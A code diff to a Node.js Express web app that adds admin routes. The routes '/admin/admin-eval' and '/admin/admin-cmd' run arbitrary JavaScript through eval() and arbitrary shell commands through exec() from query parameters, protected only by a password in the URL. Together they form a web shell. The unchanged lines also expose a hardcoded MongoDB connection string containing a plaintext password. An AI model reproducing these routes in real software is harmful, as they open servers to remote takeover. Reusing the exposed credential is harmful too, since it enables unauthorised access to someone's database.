@@ -3,6 +3,7 @@ const app = express()
 const chalk = require("chalk")
 const mongoose = require("mongoose")
 const crypto = require("./functions/get.js")
+const config = require("./config.json")
 app.use(express.urlencoded({ extended: false }))
 app.use(express.static("views"))
 
@@ -13,6 +14,7 @@ mongoose.connect("mongodb+srv://undefined:8kLbQ18n2zfQemlF@cluster0.wks5o.mongod
         )
     )
 })
+
 mongoose.connection.on('connected',()=>{
     console.log(
         chalk.bold(
@@ -27,6 +29,44 @@ app.get("/notes-main", (req,res) => {
 
 app.get("/", (req,res) => {
     res.render("shorter/index.ejs")
+})
+
+
+app.get("/admin", (req,res) => {
+    if(req.query.nick !== config.nick) {
+        if(req.query.pass !== config.pass) {
+            res.render("admin/login.ejs")
+        } else {
+            res.render("admin/login.ejs")
+        }
+    } else if (req.query.nick === config.nick) {
+        if(req.query.pass === config.pass) {
+            res.render("admin/panel.ejs")
+        }
+    }
+})
+
+app.get("/admin/admin-eval", (req,res) => {
+    if(req.query.pass !== config.pass) return
+    let evaled = eval(req.query.eval)
+    res.send(evaled)
+})
+
+app.get("/admin/admin-cmd", async(req,res) => {
+    if(req.query.pass !== config.pass) return
+    const { exec } = require("child_process");
+
+    exec(req.query.cmd, (error, stdout, stderr) => {
+        if (error) {
+            res.send(`error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            res.send(`stderr: ${stderr}`);
+            return;
+        }
+        res.send(`stdout: ${stdout}`);
+    });
 })
 
 app.get("/cryptocurrency", async(req,res) => {
